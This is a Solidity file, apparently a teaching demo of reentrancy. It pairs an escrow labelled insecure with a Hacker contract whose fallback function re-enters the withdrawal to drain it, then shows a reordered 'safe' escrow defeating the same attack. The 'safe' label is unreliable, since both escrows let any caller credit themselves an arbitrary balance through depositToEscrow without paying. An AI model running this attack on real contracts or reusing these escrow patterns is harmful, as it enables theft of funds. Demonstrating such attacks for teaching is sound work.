pragma solidity >=0.5.0 <=0.7.0;

// THIS CONTRACT is INSECURE - DO NOT USE
contract Escrow {
    mapping(address => uint) escrowBalances;

    constructor() public payable {
        escrowBalances[address(this)] = 1000000;
    }  
    
    function depositToEscrow(uint _amount) public
    {
        escrowBalances[msg.sender] = _amount;
    }
    
    function withdrawFund() public {
        //external call
        uint currentBalance = escrowBalances[msg.sender];
        (bool withdrawn, ) = msg.sender.call.value(currentBalance)("");
        if (withdrawn) escrowBalances[msg.sender] = 0;
    }
}
   
contract Hacker {
    Escrow e;
    uint public reentrancy;
    event withdrawnEvent(uint c, uint balance);
    
    constructor(address vulnerable) public {
        e = Escrow(vulnerable);
    }
       
    function attack() public {
        e.depositToEscrow(1000000);
        e.withdrawFund();
    } 
    
    function () external payable {
        reentrancy++;
        emit withdrawnEvent(reentrancy, address(e).balance);
        if (reentrancy < 10) {
            e.withdrawFund();
        }
    }
} 
   
// THIS CONTRACT is considered as safe
contract SafeEscrow {
    mapping(address => uint) escrowBalances;

    constructor() public payable {
        escrowBalances[address(this)] = 1000000;
    } 
    
    function depositToEscrow(uint _amount) public
    {
        escrowBalances[msg.sender] = _amount;
    }
    
    function withdrawFund() public {
        //external call
        uint currentBalance = escrowBalances[msg.sender];
        escrowBalances[msg.sender] = 0;
        (bool withdrawn, ) = msg.sender.call.value(currentBalance)("");
        if (!withdrawn) revert(); 
    }
}

contract FailedHacker {
    SafeEscrow se;
    uint public reentrancy;
    event withdrawnEvent(uint c, uint balance);
    
    constructor(address vulnerable) public {
        se = SafeEscrow(vulnerable);
    }
       
    function attack() public {
        se.depositToEscrow(1000000);
        se.withdrawFund();
    } 
    
    function () external payable {
        reentrancy++;
        emit withdrawnEvent(reentrancy, address(se).balance);
        if (reentrancy < 10) {
            se.withdrawFund();
        }
    }
} 
